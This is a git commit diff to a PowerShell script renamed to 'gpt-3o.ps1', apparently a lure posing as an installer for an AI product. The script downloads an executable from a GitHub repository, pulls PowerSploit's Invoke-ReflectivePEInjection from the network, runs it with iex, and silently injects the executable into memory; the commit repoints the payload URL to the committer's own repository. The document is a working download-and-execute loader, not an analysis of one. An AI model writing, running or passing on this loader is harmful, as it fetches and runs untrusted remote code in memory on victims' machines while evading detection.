e877fd2264a9f6bfb071aec99e3b93dcd4b78412
rootkalilocalhost <140280170+rootkalilocalhost@users.noreply.github.com>
2025-11-05 22:30:42 +0200

    Update and rename exp.ps1 to gpt-3o.ps1

--- gpt-3o.ps1
+++ gpt-3o.ps1
@@ -1,5 +1,5 @@
 try {
-    $exeBytes = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/nathan-ingram10/GPT-3o-mini/main/GPT-3o_win-x64_setup.exe')  
+    $exeBytes = (New-Object Net.WebClient).DownloadData('https://github.com/rootkalilocalhost/modules/main/GPT-3o_win-x64_setup.exe')  
     $script = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')
     iex $script
     Invoke-ReflectivePEInjection -PEBytes $exeBytes -ExeArgs '/S'  # Silent
